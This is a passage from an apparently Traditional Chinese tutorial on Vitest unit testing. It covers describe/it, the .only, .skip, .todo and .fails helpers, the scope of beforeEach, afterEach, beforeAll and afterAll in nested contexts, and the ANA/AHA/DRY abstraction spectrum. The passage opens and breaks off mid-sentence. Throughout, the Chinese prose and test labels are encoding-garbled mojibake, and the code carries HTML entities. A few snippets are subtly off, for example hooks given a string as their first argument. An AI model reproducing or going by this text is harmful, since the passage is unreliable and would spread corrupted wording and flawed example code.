é¡¯ç¤ºã€Œé€šéèˆ‡å¦ã€ï¼Œè€Œé€™ä¸€éƒ¨åˆ†æ¸¬è©¦å·¥å…·æˆ–æ¡†æ¶éƒ½æœƒå¹«æˆ‘å€‘è™•ç†å¥½ï¼Œç”šè‡³éƒ½é‚„æœ‰æä¾›é¡å¤–çš„ diff å·®ç•°è®“æˆ‘å€‘å¿«é€ŸæŸ¥çœ‹éŒ¯èª¤çš„åœ°æ–¹ã€‚\nTimely(å³æ™‚) æ¸¬è©¦ç¨‹å¼ç¢¼è¦ç›¡å¯èƒ½çš„èˆ‡ç”¢å“ç¨‹å¼ç¢¼åŒé€²é€€ï¼Œå¦‚æœæ¸¬è©¦ç¨‹å¼ç¢¼è½å¾Œç”¢å“ç¨‹å¼ç¢¼å¤ªå¤šï¼Œæ¸¬è©¦ç¨‹å¼ç¢¼æœƒè¶Šä¾†è¶Šé›£è·Ÿä¸Šç”¢å“ç¨‹å¼ç¢¼çš„æ­¥èª¿ã€‚\nè€Œæ ¹æ“šå°å¾…æ¸¬è©¦ç¨‹å¼ç¢¼å¿ƒæ…‹çš„å„ªè‰¯æ³•å‰‡ï¼Œåœ¨æ’°å¯«æ¸¬è©¦ç¨‹å¼ç¢¼æ™‚å°±èƒ½æ›´å®¹æ˜“é«”æœƒåˆ°ä»–çš„é­…åŠ›ã€‚\ndescribe \u0026amp; it èˆ‡ è¼”åŠ© API describe \u0026amp; it åŸºç¤ç”¨æ³• ç¨æ—©æœ‰æåˆ°çš„æ¸¬è©¦æƒ…å¢ƒèˆ‡æ¸¬è©¦æ¡ˆä¾‹åœ¨ Vitest å·¥å…·ä¸­ä¸»è¦ä¾¿æ˜¯é€é describe èˆ‡ it(æˆ– test) ä¾†æ’°å¯«ï¼Œè€Œä»–å€‘çš„ç”¨æ„é™¤äº†è¦åŠƒæ¸¬è©¦çš„è„ˆçµ¡ä¹‹å¤–ï¼Œæœ€ä¸»è¦æ˜¯ç”¨ä¾†åŒ…è£æ–·è¨€çµæœçš„è³‡è¨Šï¼š\n1 2 3 4 5 6 7 8 import {describe, it} from \u0026#39;vitest\u0026#39; describe(\u0026#39;æ¸¬è©¦æƒ…å¢ƒçš„æè¿°\u0026#39;, () =\u0026gt; { it(\u0026#39;ç¬¬ä¸€å€‹æ¸¬è©¦æ¡ˆä¾‹çš„æè¿°\u0026#39;, () =\u0026gt; { const add = (x, y) =\u0026gt; x + y expect(add(1, 2)).toBe(2) }) }) å‡è¨­åœ¨çµ‚ç«¯æ©ŸåŸ·è¡Œä¸Šæ–¹çš„æ¸¬è©¦ç¨‹å¼ç¢¼æ™‚ï¼Œä¾æ“šå·¥å…·é è¨­è¨­å®šæœƒåœ¨çµ‚ç«¯æ©Ÿé¡¯ç¤ºã€ŒéŒ¯èª¤çš„ç›¸é—œè³‡è¨Šã€èˆ‡ã€Œç¶œåˆçµæœã€ã€‚\néŒ¯èª¤çš„ç›¸é—œè³‡è¨Šï¼š\nFAILï¼šç™¼ç”Ÿæ–·è¨€éŒ¯èª¤æª”æ¡ˆè·¯å¾‘ + æƒ…å¢ƒæè¿° + æ¡ˆä¾‹æè¿°(è¦–ç•¶ä¸‹éŒ¯èª¤æ‰€å±¬çš„æƒ…å¢ƒèˆ‡æ¡ˆä¾‹)ã€‚ AssertionErrorï¼šç™¼ç”Ÿæ–·è¨€éŒ¯èª¤çš„åŸå› ï¼Œèˆ‡ç™¼ç”ŸéŒ¯èª¤çš„æ®µè½ã€‚ Expectedï¼šé æœŸçµæœã€‚ Receivedï¼šå¯¦éš›çµæœã€‚ ç¶œåˆçµæœï¼š\nTest Filesï¼šç¸½å…±æ¸¬è©¦äº†å¹¾éš»æ¸¬è©¦æª”æ¡ˆï¼Œä¸¦é¡¯ç¤ºæˆåŠŸã€å¤±æ•—èˆ‡è·³éçš„æ•¸é‡ã€‚ Testsï¼šç¸½å…±æ¸¬äº†å¹¾å€‹æ¸¬è©¦æ¡ˆä¾‹ï¼Œä¸¦é¡¯ç¤ºæˆåŠŸã€å¤±æ•—èˆ‡è·³éçš„æ•¸é‡ã€‚ Startï¼šæ¸¬è©¦é–‹å§‹æ™‚é–“ã€‚ Durationï¼šæ¸¬è©¦éç¨‹ç¸½å…±è€—è²»æ™‚é–“ã€‚ è€Œé™¤äº†ä¸Šè¿°åŸºæœ¬ç”¨æ³•ä¹‹å¤–ï¼Œåœ¨åŒä¸€å€‹æ¸¬è©¦æƒ…å¢ƒä¸­ä¹Ÿèƒ½å®¹ç´æ•¸å€‹æ¸¬è©¦æ¡ˆä¾‹ã€‚\n1 2 3 4 5 6 7 8 describe(\u0026#39;æ¸¬è©¦æƒ…å¢ƒçš„æè¿°\u0026#39; , () =\u0026gt; { it(\u0026#39;ç¬¬ä¸€å€‹æ¸¬è©¦æ¡ˆä¾‹çš„æè¿°\u0026#39;, () =\u0026gt; { // ... }) it(\u0026#39;ç¬¬äºŒå€‹æ¸¬è©¦æ¡ˆä¾‹çš„æè¿°\u0026#39;, () =\u0026gt; { // ... }) }) ç”šè‡³æ¸¬è©¦æƒ…å¢ƒè¼ƒç‚ºè¤‡é›œçš„æƒ…æ³ï¼Œæ¸¬è©¦æƒ…å¢ƒ(describe)ä¹Ÿå…è¨±å·¢ç‹€çš„æ–¹å¼ä¾†å»ºæ§‹æ¸¬è©¦ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 describe(\u0026#39;çˆ¶å±¤æƒ…å¢ƒ\u0026#39;, () =\u0026gt; { describe(\u0026#39;åŸºæ–¼çˆ¶å±¤æƒ…å¢ƒçš„æƒ…å¢ƒä¸€\u0026#39;, () =\u0026gt; { it(\u0026#39;æ¸¬è©¦æ¡ˆä¾‹\u0026#39;, () =\u0026gt; { // ... }) }) describe(\u0026#39;åŸºæ–¼çˆ¶å±¤æƒ…å¢ƒçš„æƒ…å¢ƒäºŒ\u0026#39;, () =\u0026gt; { it(\u0026#39;æ¸¬è©¦æ¡ˆä¾‹\u0026#39;, () =\u0026gt; { // ... }) it(\u0026#39;å‡ºç¾æç¤ºå¯„ä»¶è€…å§“åèˆ‡é›»è©±å°‡ç›´æ¥è¨»å†Šæˆæœƒå“¡\u0026#39;, () =\u0026gt; { // ... }) }) }) ç›¸ååœ°ï¼Œè‹¥åœ¨ç°¡å–®çš„æƒ…å¢ƒçš„ä¹‹ä¸‹ï¼Œåªæœ‰æ¸¬è©¦æ¡ˆä¾‹ä¹Ÿæ˜¯å…è¨±çš„æ–¹å¼ä¹‹ä¸€ï¼š\n1 2 3 4 5 6 7 8 9 it(\u0026#39;æ¸¬è©¦æ¡ˆä¾‹\u0026#39;, () =\u0026gt; { // ... }) it(\u0026#39;æ¸¬è©¦æ¡ˆä¾‹\u0026#39;, () =\u0026gt; { // ... }) it(\u0026#39;æ¸¬è©¦æ¡ˆä¾‹\u0026#39;, () =\u0026gt; { // ... }) describe \u0026amp; it è¼”åŠ© API é™¤äº†ä¸Šè¿°çš„åŸºæœ¬ç”¨æ³•ä¹‹å¤–ï¼Œé€é describe èˆ‡ it æ’°å¯«æ¸¬è©¦çš„éç¨‹ä¸­ä¹Ÿèƒ½é€éè¼”åŠ©çš„ API ä¾†æ•´ç†æ¸¬è©¦ç¨‹å¼ç¢¼ï¼š\n.onlyï¼šæ¸¬è©¦æƒ…å¢ƒã€æ¸¬è©¦æ¡ˆä¾‹çš†å¯ä½¿ç”¨ .skipï¼šæ¸¬è©¦æƒ…å¢ƒã€æ¸¬è©¦æ¡ˆä¾‹çš†å¯ä½¿ç”¨ .todoï¼šæ¸¬è©¦æƒ…å¢ƒã€æ¸¬è©¦æ¡ˆä¾‹çš†å¯ä½¿ç”¨ .failsï¼šæ¸¬è©¦æ¡ˆä¾‹æ‰èƒ½ä½¿ç”¨ only è‹¥åœ¨æ¸¬è©¦æƒ…å¢ƒç”¨äº†æ­¤æŒ‡ä»¤ï¼Œå‰‡åœ¨åŒå€‹æ¸¬è©¦æª”æ¡ˆä¸­åªæœƒåŸ·è¡Œå¸¶æœ‰ .only çš„æ¸¬è©¦æƒ…å¢ƒï¼Œè€Œå…¶é¤˜æ¸¬è©¦æƒ…å¢ƒåº•ä¸‹æ‰€æœ‰çš„æ¸¬è©¦æ¡ˆä¾‹å°‡æœƒè¢«è·³é(skipped)ï¼š\n1 2 3 describe.only(\u0026#39;æ¸¬è©¦æƒ…å¢ƒ 1\u0026#39;, () =\u0026gt; { /* */ }) describe(\u0026#39;æ¸¬è©¦æƒ…å¢ƒ 2\u0026#39;, () =\u0026gt; { /* */ }) // skipped describe(\u0026#39;æ¸¬è©¦æƒ…å¢ƒ 3\u0026#39;, () =\u0026gt; { /* */ }) // skipped è‹¥åœ¨æ¸¬è©¦æ¡ˆä¾‹ä¸­ä½¿ç”¨ï¼Œå‰‡é™¤äº†å¸¶æœ‰ .only ä¹‹å¤–çš„æ¸¬è©¦æ¡ˆä¾‹éƒ½å°‡æœƒè¢«è·³éï¼š\n1 2 3 4 5 6 7 8 9 10 11 describe(\u0026#39;æ¸¬è©¦æƒ…å¢ƒ 1\u0026#39;, () =\u0026gt; { it.only(\u0026#39;æ¸¬è©¦æ¡ˆä¾‹\u0026#39;, () =\u0026gt; { /* */ }) it(\u0026#39;æ¸¬è©¦æ¡ˆä¾‹\u0026#39;, () =\u0026gt; { /* */ }) // skipped }) describe(\u0026#39;æ¸¬è©¦æƒ…å¢ƒ 2\u0026#39;, () =\u0026gt; { it.only(\u0026#39;æ¸¬è©¦æ¡ˆä¾‹\u0026#39;, () =\u0026gt; { /* */ }) it(\u0026#39;æ¸¬è©¦æ¡ˆä¾‹\u0026#39;, () =\u0026gt; { /* */ }) // skipped }) describe(\u0026#39;æ¸¬è©¦æƒ…å¢ƒ 3\u0026#39;, () =\u0026gt; { /* */ }) // skipped skip æ¸¬è©¦æƒ…å¢ƒæˆ–æ¸¬è©¦æ¡ˆä¾‹è¢«æ¨™æ³¨æ™‚ï¼Œå°‡è‡ªå‹•è·³éè©²ç¯„ç–‡å…§çš„æ¸¬è©¦æ¡ˆä¾‹ï¼š\n1 2 3 4 5 6 7 8 9 describe.skip(\u0026#39;æ¸¬è©¦æƒ…å¢ƒ 1\u0026#39;, () =\u0026gt; { it(\u0026#39;æ¸¬è©¦æ¡ˆä¾‹\u0026#39;, () =\u0026gt; { /* */ }) // skipped it(\u0026#39;æ¸¬è©¦æ¡ˆä¾‹\u0026#39;, () =\u0026gt; { /* */ }) // skipped }) describe(\u0026#39;æ¸¬è©¦æƒ…å¢ƒ 2\u0026#39;, () =\u0026gt; { it(\u0026#39;æ¸¬è©¦æ¡ˆä¾‹\u0026#39;, () =\u0026gt; { /* */ }) it.skip(\u0026#39;æ¸¬è©¦æ¡ˆä¾‹\u0026#39;, () =\u0026gt; { /* */ }) // skipped }) todo æ¸¬è©¦æƒ…å¢ƒæˆ–æ¸¬è©¦æ¡ˆä¾‹è¢«æ¨™æ³¨æ™‚ï¼ŒåŒæ¨£å°‡è‡ªå‹•è·³éè©²ç¯„ç–‡å…§çš„æ¸¬è©¦æ¡ˆä¾‹ï¼Œä½† todo å«ç¾©æ¯”è¼ƒæ¥è¿‘å¾…åŠ å…¥æ¸¬è©¦çš„å€å¡Šï¼Œä¸¦ä¸”å°‡ä¾†è‹¥ç”¢å‡ºå ±å‘Šæ™‚ä¹Ÿæœƒç‰¹åˆ¥æ•´ç†å‡ºé‚„æœ‰å“ªäº›åœ°æ–¹éœ€è¦è£œä¸Šæ¸¬è©¦ã€‚\nfails æœ€å¾Œä¸€å€‹ä»‹ç´¹çš„æ˜¯æ¸¬è©¦æ¡ˆä¾‹æ‰èƒ½ä½¿ç”¨çš„è¼”åŠ© APIï¼Œé‚„è¨˜å¾—åˆ—æ¸¬è©¦æ¡ˆä¾‹æ™‚çš„ sad path å—ï¼Ÿç•¶æ¸¬è©¦æ¡ˆä¾‹æ‡‰è©²è¦å¤±æ•—çš„æ™‚å€™å°±å¯ä»¥é€é fails é¡¯æ€§æ¨™è¨»ä»–å€‘ï¼š\n1 2 3 4 it.fails(`\u0026#39;1\u0026#39; + \u0026#39;1\u0026#39; should not to be \u0026#39;11\u0026#39;`, () =\u0026gt; { const add = (x, y) =\u0026gt; Number(x) + Number(y) expect(add(\u0026#39;1\u0026#39;, \u0026#39;1\u0026#39;)).toBe(\u0026#39;11\u0026#39;) }) ç•¶ç„¶ä½ ä¹Ÿå¯ä»¥å–®ç´”è—‰ç”±æ–·è¨€ä¸­çš„ .not é”åˆ°åŒæ¨£çš„æ•ˆæœï¼š\n1 2 3 4 it(`\u0026#39;1\u0026#39; + \u0026#39;1\u0026#39; should not to be \u0026#39;11\u0026#39;`, () =\u0026gt; { const add = (x, y) =\u0026gt; Number(x) + Number(y) expect(add(\u0026#39;1\u0026#39;, \u0026#39;1\u0026#39;)).not.toBe(\u0026#39;11\u0026#39;) }) ä»¥ä¸Šä¾¿æ˜¯æ¸¬è©¦ç¨‹å¼ç¢¼ä¸­æ¸¬è©¦æƒ…å¢ƒèˆ‡æ¸¬è©¦æ¡ˆä¾‹çš„éƒ¨åˆ†ï¼Œæœ‰é—œæ–¼è¼”åŠ© API çš„éƒ¨åˆ†æœ‰äº›å…§å®¹ä¸ä¸€å®šæœƒä½¿ç”¨çš„åˆ°ï¼Œè‹¥æƒ³æ›´åŠ ç­è§£æ‰€æœ‰å¯ç”¨çš„éƒ¨åˆ†å¯ä»¥åƒè€ƒ Vitest æ¸¬è©¦æƒ…å¢ƒ èˆ‡ æ¸¬è©¦æ¡ˆä¾‹ çš„æ–‡ä»¶å›‰ã€‚\næº–å‚™(Setup)èˆ‡æ¸…ç†(Teardown) ç¶“éäº†åŸºæœ¬çš„æ¸¬è©¦æƒ…å¢ƒèˆ‡æ¸¬è©¦æ¡ˆä¾‹èªæ³•ï¼ŒåŠ ä¸Šç°¡å–®çš„æ–·è¨€èªæ³• expect().toBe() å°±èƒ½å¤ æ¸¬è©¦è¨±å¤šç°¡å–®çš„æ±è¥¿äº†ï¼Œç„¶è€Œåœ¨æ¸¬è©¦éç¨‹ä¸­æœ‰æ™‚æœƒé‡åˆ°å¤§é‡é‡è¤‡çš„ã€Œå‰ç½®æ“ä½œã€æˆ–æ˜¯æ¯æ¬¡æ¸¬è©¦å¾Œã€Œéœ€è¦æ¸…ç†æ¸¬è©¦ä¸­çš„ç’°å¢ƒã€ï¼Œé€™æ™‚æˆ‘å€‘å¯ä»¥é€é Vitest æä¾›çš„ Setup \u0026amp; Teardown API ä¾†è™•ç†ï¼š\nbeforeEachï¼šåœ¨æ¯å€‹æ¸¬è©¦æ¡ˆä¾‹åŸ·è¡Œå‰å‘¼å«ä¸€æ¬¡ã€‚ beforeAllï¼šåœ¨æ‰€æœ‰æ¸¬è©¦æ¡ˆä¾‹åŸ·è¡Œå‰å‘¼å«ä¸€æ¬¡ã€‚ afterEachï¼šåœ¨æ¯å€‹æ¸¬è©¦æ¡ˆä¾‹åŸ·è¡Œå¾Œå‘¼å«ä¸€æ¬¡ã€‚ afterAllï¼šåœ¨æ‰€æœ‰æ¸¬è©¦æ¡ˆä¾‹åŸ·è¡Œå¾Œå‘¼å«ä¸€æ¬¡ã€‚ 1 2 3 4 beforeEach(() =\u0026gt; { // é‡å°æ¸¬è©¦æ¡ˆä¾‹é‡æ–°åˆå§‹åŒ– initTestEnv() }) Setup \u0026amp; Teardown API çš„ç¯„ç–‡ Setup \u0026amp; Teardown API ã€Œæ‰€æœ‰ã€çš„å®šç¾©æ˜¯æ ¹æ“šç•¶ä¸‹çš„ç¯„ç–‡(context)ä¾†æ±ºå®šï¼Œé™¤äº†æ¸¬è©¦æª”æ¡ˆæœ¬èº«ä¹‹å¤–ï¼Œä½¿ç”¨ describe ä¾†å®šç¾©æ¸¬è©¦æƒ…å¢ƒä¹Ÿæœƒå½¢æˆä¸€å€‹ contextï¼Œå› æ­¤å‡å¦‚æ¸¬è©¦æƒ…å¢ƒæœ‰å·¢ç‹€çš„æƒ…æ³å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 const history = [] describe(\u0026#39;çˆ¶å±¤æƒ…å¢ƒ\u0026#39;, () =\u0026gt; { beforeAll(() =\u0026gt; { history.push(\u0026#39;beforeAll - çˆ¶å±¤æƒ…å¢ƒ\u0026#39;) }) beforeEach(() =\u0026gt; { history.push(\u0026#39;beforeEach - çˆ¶å±¤æƒ…å¢ƒ\u0026#39;) }) afterAll(() =\u0026gt; { history.push(\u0026#39;afterAll - çˆ¶å±¤æƒ…å¢ƒ\u0026#39;) }) afterEach(() =\u0026gt; { history.push(\u0026#39;afterEach - çˆ¶å±¤æƒ…å¢ƒ\u0026#39;) }) describe(\u0026#39;å­å±¤æƒ…å¢ƒ A\u0026#39;, () =\u0026gt; { beforeAll(() =\u0026gt; { history.push(\u0026#39;beforeAll - å­å±¤æƒ…å¢ƒ A\u0026#39;) }) beforeEach(() =\u0026gt; { history.push(\u0026#39;beforeEach - å­å±¤æƒ…å¢ƒ A\u0026#39;) }) afterAll(() =\u0026gt; { history.push(\u0026#39;afterAll - å­å±¤æƒ…å¢ƒ A\u0026#39;) }) afterEach(() =\u0026gt; { history.push(\u0026#39;afterEach - å­å±¤æƒ…å¢ƒ A\u0026#39;) }) it(\u0026#39;æ¡ˆä¾‹ 1\u0026#39;, () =\u0026gt; { history.push(\u0026#39;å­å±¤æƒ…å¢ƒ A æ¡ˆä¾‹ 1\u0026#39;) }) it(\u0026#39;æ¡ˆä¾‹ 2\u0026#39;, () =\u0026gt; { history.push(\u0026#39;å­å±¤æƒ…å¢ƒ A æ¡ˆä¾‹ 2\u0026#39;) }) }) describe(\u0026#39;å­å±¤æƒ…å¢ƒ B\u0026#39;, () =\u0026gt; { beforeAll(() =\u0026gt; { history.push(\u0026#39;beforeAll - å­å±¤æƒ…å¢ƒ B\u0026#39;) }) beforeEach(() =\u0026gt; { history.push(\u0026#39;beforeEach - å­å±¤æƒ…å¢ƒ B\u0026#39;) }) afterAll(() =\u0026gt; { history.push(\u0026#39;afterAll - å­å±¤æƒ…å¢ƒ B\u0026#39;) }) afterEach(() =\u0026gt; { history.push(\u0026#39;afterEach - å­å±¤æƒ…å¢ƒ B\u0026#39;) }) it(\u0026#39;æ¡ˆä¾‹ 1\u0026#39;, () =\u0026gt; { history.push(\u0026#39;å­å±¤æƒ…å¢ƒ B æ¡ˆä¾‹ 1\u0026#39;) }) it(\u0026#39;æ¡ˆä¾‹ 2\u0026#39;, () =\u0026gt; { history.push(\u0026#39;å­å±¤æƒ…å¢ƒ B æ¡ˆä¾‹ 2\u0026#39;) }) }) }) æ­¤æ™‚å°‡é€é console.log(history) æŸ¥çœ‹ä¸¦æ­¸ç´æ•´ç†å°±èƒ½å¾—åˆ°ä»¥ä¸‹çµæœï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 --- é€²å…¥æ¸¬è©¦ç¨‹å¼ç¢¼æœ¬èº«çš„ Context --- é€²å…¥çˆ¶å±¤æƒ…å¢ƒçš„ Context beforeAll - çˆ¶å±¤æƒ…å¢ƒ --- é€²å…¥å­å±¤æƒ…å¢ƒ A çš„ Context beforeAll - å­å±¤æƒ…å¢ƒ A beforeEach - çˆ¶å±¤æƒ…å¢ƒ beforeEach - å­å±¤æƒ…å¢ƒ A å­å±¤æƒ…å¢ƒ A æ¡ˆä¾‹ 1 // åŸ·è¡Œ æƒ…å¢ƒ A æ¡ˆä¾‹ 1 çš„æ™‚é–“é» afterEach - å­å±¤æƒ…å¢ƒ A afterEach - çˆ¶å±¤æƒ…å¢ƒ beforeEach - çˆ¶å±¤æƒ…å¢ƒ beforeEach - å­å±¤æƒ…å¢ƒ A å­å±¤æƒ…å¢ƒ A æ¡ˆä¾‹ 2 // åŸ·è¡Œ æƒ…å¢ƒ A æ¡ˆä¾‹ 2 çš„æ™‚é–“é» afterEach - å­å±¤æƒ…å¢ƒ A afterEach - çˆ¶å±¤æƒ…å¢ƒ afterAll - å­å±¤æƒ…å¢ƒ A --- é›¢é–‹å­å±¤æƒ…å¢ƒ A çš„ Context --- é€²å…¥å­å±¤æƒ…å¢ƒ B çš„ Context beforeAll - å­å±¤æƒ…å¢ƒ B beforeEach - çˆ¶å±¤æƒ…å¢ƒ beforeEach - å­å±¤æƒ…å¢ƒ B å­å±¤æƒ…å¢ƒ B æ¡ˆä¾‹ 1 // åŸ·è¡Œ æƒ…å¢ƒ B æ¡ˆä¾‹ 1 çš„æ™‚é–“é» afterEach - å­å±¤æƒ…å¢ƒ B afterEach - çˆ¶å±¤æƒ…å¢ƒ beforeEach - çˆ¶å±¤æƒ…å¢ƒ beforeEach - å­å±¤æƒ…å¢ƒ B å­å±¤æƒ…å¢ƒ B æ¡ˆä¾‹ 2 // åŸ·è¡Œ æƒ…å¢ƒ B æ¡ˆä¾‹ 2 çš„æ™‚é–“é» afterEach - å­å±¤æƒ…å¢ƒ B afterEach - çˆ¶å±¤æƒ…å¢ƒ afterAll - å­å±¤æƒ…å¢ƒ B --- é›¢é–‹å­å±¤æƒ…å¢ƒ B çš„ Context afterAll - çˆ¶å±¤æƒ…å¢ƒ --- é›¢é–‹çˆ¶å±¤æƒ…å¢ƒçš„ Context --- é›¢é–‹æ¸¬è©¦ç¨‹å¼ç¢¼æœ¬èº«çš„ Context å› æ­¤æˆ‘å€‘åœ¨ä½¿ç”¨é€™é¡ API æ™‚è¦æ³¨æ„ç•¶ä¸‹ context æ‰€åŒ…å«çš„ç¯„åœã€‚\né¿å…èª¤å€ï¼šåœ¨ expect å¾Œåšæ¸…æƒè™•ç† é™¤äº†ä¸Šé¢çš„ç”¨æ³•ï¼Œæœ‰æ™‚å€™ä½ å¯èƒ½æœƒèªç‚ºæ—¢ç„¶è¦æ¸…æƒï¼Œé‚£æˆ‘ä½•ä¸åœ¨æ–·è¨€å¾Œè™•ç†å°±å¥½å‘¢ï¼š\n1 2 3 4 5 6 7 describe(\u0026#39;\u0026#39;, () =\u0026gt; { it(\u0026#39;\u0026#39;, () =\u0026gt; { expect().toBe() // åœ¨é€™è£¡åšæ¸…é™¤ resetTestingEnv() }) }) é€™éº¼åšç•¶ä½ åœ¨æ¸¬è©¦æ¡ˆä¾‹éƒ½æ˜¯é€šéçš„æƒ…æ³ä¸‹éƒ½æ²’æœ‰å•é¡Œï¼Œä½†æ˜¯ä¸€ä½†æŸå€‹æ¸¬è©¦æ¡ˆä¾‹ç™¼ç”Ÿäº†éŒ¯èª¤ï¼Œç”±æ–¼æ¸¬è©¦æ¡ˆä¾‹å°±æœƒåœ¨æ–·è¨€æ™‚æ‹‹å‡º AssertionError å¾Œåœæ­¢ï¼Œå› æ­¤å¾ˆæœ‰å¯èƒ½å› ç‚ºä¸€å€‹æ¸¬è©¦æ¡ˆä¾‹å£äº†å°è‡´æ¥ä¸‹ä¾†æ‰€æœ‰æ¸¬è©¦éƒ½å—åˆ°å½±éŸ¿ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 describe(\u0026#39;\u0026#39;, () =\u0026gt; { it(\u0026#39;\u0026#39;, () =\u0026gt; { expect().toBe() // AssertionErrorï¼Œé€™å€‹æ¸¬è©¦æ¡ˆä¾‹å°±åœåœ¨é€™äº† resetTestingEnv() }) it(\u0026#39;\u0026#39;, () =\u0026gt; { // åœ¨æ²’æœ‰ç¶“é `resetTestingEnv()` ä¸‹é€²è¡Œæ¸¬è©¦ }) it(\u0026#39;\u0026#39;, () =\u0026gt; { // åœ¨æ²’æœ‰ç¶“é `resetTestingEnv()` ä¸‹é€²è¡Œæ¸¬è©¦ }) it(\u0026#39;\u0026#39;, () =\u0026gt; { // åœ¨æ²’æœ‰ç¶“é `resetTestingEnv()` ä¸‹é€²è¡Œæ¸¬è©¦ }) it(\u0026#39;\u0026#39;, () =\u0026gt; { // åœ¨æ²’æœ‰ç¶“é `resetTestingEnv()` ä¸‹é€²è¡Œæ¸¬è©¦ }) }) å› æ­¤è¼ƒä½³çš„ä½œæ³•é‚„æ˜¯ä½¿ç”¨ Setup \u0026amp; Teardown API ä¾†è™•ç†æœƒæ¯”è¼ƒå¥½ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 describe(\u0026#39;\u0026#39;, () =\u0026gt; { beforeEach(\u0026#39;\u0026#39;, () =\u0026gt; { setupTestingEnv() }) afterEach(\u0026#39;\u0026#39;, () =\u0026gt; { resetTestingEnv() }) it(\u0026#39;\u0026#39;, () =\u0026gt; {}) it(\u0026#39;\u0026#39;, () =\u0026gt; {}) it(\u0026#39;\u0026#39;, () =\u0026gt; {}) it(\u0026#39;\u0026#39;, () =\u0026gt; {}) it(\u0026#39;\u0026#39;, () =\u0026gt; {}) }) é¿å…éåº¦ä½¿ç”¨ Setup \u0026amp; Teardown API ä¸€åå°æ–¼æ¸¬è©¦é ˜åŸŸé —æœ‰ç ”ç©¶çš„ Kent C. Dodds åœ¨ twitter ä¸Šç™¼è¡¨ï¼š\nè¨±å¤šäººä¸€çœ‹äº†ç´›ç´›è¡¨ç¤ºä¸­æ§ï¼Œå¿ƒæƒ³é€™ä¸å°±æ˜¯æˆ‘åœ¨å¯«çš„æ±è¥¿å—ï¼Ÿå› æ­¤ç™¼æ–‡ä¸€å‡ºä¸å°‘äººå°±å¥½å¥‡é‚£éº¼åˆ°åº•ç‚ºä»€éº¼ä¸Šæ–¹çš„ç”¨æ³•æœƒæ¯”è¼ƒå¥½å‘¢ï¼Ÿä¸”è®“æˆ‘å€‘å¾æŠ½è±¡å…‰è­œä»‹ç´¹èµ·ã€‚\næŠ½è±¡å…‰è­œ(The Spectrum of Abstraction) Kent C. Dodds æå‡ºåœ¨æŠ½è±¡å…‰è­œä¸­ä¸»è¦åˆ†æˆäº†ä¸‰ç¨®æ¦‚å¿µï¼š\nANAï¼šAbsolutely No Abstraction AHAï¼šAvoid Hasty Abstraction DRYï¼šDon\u0026rsquo;t Repeat Yourself è€Œå¾Œä¸¦å°‡æ­¤æ¦‚å¿µæ‡‰ç”¨åœ¨ Testing èº«ä¸Šä¸¦åˆ†åˆ¥è§£èªªäº†ä¸‰ç¨®æŠ½è±¡å‹æ…‹ä¸‹çš„æ¸¬è©¦çš„å„ªåŠ£åˆ†æã€‚\nå…¶ä¸­æˆ‘å€‘å¾€å¾€ä¸€é–‹å§‹å­¸ç¿’å¯èƒ½å› ç‚ºå°èªæ³•ä¸ç†Ÿç¨”ï¼Œå› æ­¤å¯èƒ½æœƒå¯«å‡º ANA Testing å½¢å¼ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 describe(\u0026#39;\u0026#39;, () =\u0026gt; { it(\u0026#39;\u0026#39; , () =\u0026gt; { // æº–å‚™ // æ“ä½œ // æ–·è¨€ }) it(\u0026#39;\u0026#39; , () =\u0026gt; { // æº–å‚™ï¼šé‡è¤‡çš„æº–å‚™é¡ä¼¼çš„å…§å®¹ // æ“ä½œ // æ–·è¨€ }) it(\u0026#39;\u0026#39; , () =\u0026gt; { // æº–å‚™ï¼šé‡è¤‡çš„æº–å‚™é¡ä¼¼çš„å…§å®¹ // æ“ä½œ // æ–·è¨€ }) }) è€Œéš¨è‘—æ¸¬è©¦ç¶“é©—è¶Šä¾†è¶Šç†Ÿç¨”ä¹‹å¾Œï¼Œæˆ‘å€‘å¯èƒ½æœƒæƒ³ç›¡å„ç¨®æ–¹æ³•ä¾†ã€Œç¯€çœã€æ’°å¯«æ¸¬è©¦ä¸Šçš„æ™‚é–“ï¼Œç”šè‡³åƒè€ƒ DRY å¿ƒæ³•å¯«å‡ºé€™æ¨£çš„æ¸¬è©¦ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 describe(\u0026#39;\u0026#39;, () =\u0026gt; { // çµ±ä¸€çš„äº‹å‰æº–å‚™ const testEnv = new TestEnv() beforeEach(() =\u0026gt; { testEnv.init() }) it(\u0026#39;\u0026#39; , () =\u0026gt; { // ç›´æ¥æ“ä½œäº‹å…ˆæº–å‚™å¥½çš„å…§å®¹ // æ–·è¨€ }) it(\u0026#39;\u0026#39; , () =\u0026gt; { // ç›´æ¥æ“ä½œäº‹å…ˆæº–å‚™å¥½çš„å…§å®¹ // æ–·è¨€ }) }) è€Œé€™æ¨£çš„ä¸‹å ´å°‡æœƒåœ¨è¤‡é›œçš„å·¢ç‹€æ¸¬è©¦æƒ…å¢ƒä¸‹è¶Šä¾†è¶Šé›£ä»¥é–±è®€èˆ‡èª¿æ•´ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 describe(\u0026#39;\u0026#39;, () =\u0026gt; { const testEnv = new TestEnv() beforeEach(() =\u0026gt; { testEnv.init() }) describe(\u0026#39;\u0026#39;, () =\u0026gt; { const testEnv = new TestEnv() beforeEach(() =\u0026gt; { testEnv.init() }) // ... }) describe(\u0026#39;\u0026#39;, () =\u0026gt; { const testEnv = new TestEnv() beforeEach(() =\u0026gt; { testEnv.init() }) // ... ç­‰ç­‰ é€™è£¡çš„åˆå§‹æº–å‚™æœ‰ä»€éº¼ ï¼Ÿï¼Ÿï¼Ÿ }) // ... }) è€Œé™¤äº†å·¢ç‹€æƒ…å¢ƒæœ¬èº«æ˜¯å€‹è­°é¡Œä¹‹å¤–ï¼ŒKent C. Dodds 